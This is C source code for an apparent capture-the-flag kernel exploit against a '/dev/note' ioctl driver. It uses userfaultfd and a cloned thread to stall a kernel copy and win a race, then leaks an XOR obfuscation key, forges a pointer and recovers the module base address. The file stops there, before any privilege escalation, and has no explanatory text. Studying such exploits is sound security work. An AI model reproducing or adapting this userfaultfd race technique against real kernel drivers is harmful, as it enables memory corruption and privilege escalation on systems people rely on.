#define _GNU_SOURCE        
#include <sys/wait.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <signal.h>
#include <poll.h>

#define PAGESIZE 0x1000
#define ADD 0xFFFFFF00ul
#define EDIT 0xFFFFFF01ul
#define LEAK 0xFFFFFF02ul
#define CLEAR 0xFFFFFF03ul

struct req_struct{
	unsigned long index;
	unsigned long size;
	char *payload;
};
int userfaultfd(int flags)
{
	return syscall(SYS_userfaultfd, flags);
}
void Exit(char *msg){
	perror(msg);
	exit(EXIT_FAILURE);
}
int Open(char *filename,int flags){
	int fd=open(filename,flags);
	if(fd<0){
		Exit("open");
	}
	return fd;
}
void add(int size,char *payload){
	struct req_struct req;
	req.index=0;
	req.size=(unsigned long)size;
	req.payload=payload; 
	int fd=Open("/dev/note",O_RDWR);
	if(ioctl(fd,ADD,&req)<0){
		Exit("add");
	}
	close(fd);
}
void edit(int index,char *payload){
	struct req_struct req;
	req.index=(unsigned long)index;
	req.size=0;
	req.payload=payload; 
	int fd=Open("/dev/note",O_RDWR);
	if(ioctl(fd,EDIT,&req)<0){
		Exit("edit");
	}
	close(fd);
}
void editzero(char *payload){
	struct req_struct req;
	req.index=0;
	req.size=0;
	req.payload=payload; 
	int fd=Open("/dev/note",O_RDWR);
	if(ioctl(fd,EDIT,&req)<0){
		Exit("edit");
	}
	close(fd);
}
void leak(int index,char *buf){
	struct req_struct req;
	req.index=(unsigned long)index;
	req.size=0;
	req.payload=buf; 
	int fd=Open("/dev/note",O_RDWR);
	if(ioctl(fd,LEAK,&req)<0){
		Exit("leak");
	}
	close(fd);
}
void clear(){
	struct req_struct req;
	req.index=0;
	req.size=0;
	req.payload=NULL; 
	int fd=Open("/dev/note",O_RDWR);
	if(ioctl(fd,CLEAR,&req)<0){
		Exit("clear");
	}
	close(fd);
}
void XOR(void *in, void *out, unsigned long key, size_t len) {
	unsigned long *in_ = (unsigned long *)in;
	unsigned long *out_ = (unsigned long *)out;
	for (int i = 0; i < len/8; i++) {
		out_[i] = in_[i] ^ key;
	}
}
unsigned long leakkey(){
	char writebuf[0x100],readbuf[0x100];
	memset(writebuf,0,sizeof(writebuf));
	memset(readbuf,0,sizeof(readbuf));
	writebuf[0x18]='\xff';
	add(0x19,writebuf);//create 1 chunk
	void *childstack=malloc(0x10000);
	if(childstack==NULL){
		Exit("malloc");
	}
	void *pages=mmap((void *)0xdead000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
	if((unsigned long)pages!=0xdead000){
		Exit("mmap");
	}
	int ufd=userfaultfd(O_NONBLOCK);//create page-fault handler
	if(ufd<0){
		Exit("userfaultfd");
	}
	struct uffdio_api api={.api=UFFD_API};//enable page-fault handler
	if(ioctl(ufd,UFFDIO_API,&api)){
		Exit("ufd enable");
	}
	struct uffdio_range ran={.start=(unsigned long)pages,.len=0x1000};
	struct uffdio_register reg={.range=ran,.mode=UFFDIO_REGISTER_MODE_MISSING};
	if(ioctl(ufd,UFFDIO_REGISTER,&reg)){//register page-fault handler
		Exit("ufd register");
	}
	clone(editzero,childstack+0x10000,SIGCHLD|CLONE_FILES|CLONE_VM,pages);//trigger page fault
	struct pollfd polfd={.fd=ufd,.events=POLLIN};//wait for ufd to be ready
	while(poll(&polfd,1,10)>0){
		struct uffd_msg fault_msg={0};
		if(read(ufd,&fault_msg,sizeof(fault_msg))!=sizeof(fault_msg)){
			Exit("ufd read");
		}	
		char *place=(char *)fault_msg.arg.pagefault.address;
		if((fault_msg.event!=UFFD_EVENT_PAGEFAULT)||(place!=pages && place!=pages+PAGESIZE)){
			Exit("Unexpected pagefault");
		}
		if(place==(void *)0xdead000){
			clear();
			add(0x10,writebuf);
			add(0x10,writebuf);
			struct uffdio_copy copy={.dst=(long)place,.src=(long)writebuf,.len=PAGESIZE};
			if(ioctl(ufd,UFFDIO_COPY,&copy)<0){
				Exit("ufd copy");
			}
			break;
		}
	}
	wait(NULL);
	leak(1,readbuf);
	unsigned long *ptr=(unsigned long *)readbuf;
	unsigned long key;
	key=ptr[2];
	return key;
}	
int main(){
	char tmp[0x10];
	char readbuf[0x100];
	memset(tmp,0,sizeof(tmp));
	unsigned long key,module_base;	
	unsigned long pt[0x10];
	unsigned long ct[0x10];
	key=leakkey();
	add(0x10,tmp);
	leak(1,readbuf);
	unsigned long pseudoptr=((unsigned long *)readbuf)[4]^key;
	pt[0] = 0x0;
	pt[1] = 0x0;
	pt[2] = 0x0; 
	pt[3] = 0x8; 
	pt[4] = pseudoptr - 0x68 + 0x2000;
	XOR(pt, ct, key, 5*8);
	edit(1, ct);
	leak(2,readbuf);
	module_base=((unsigned long *)readbuf)[0]-0x2520;
}
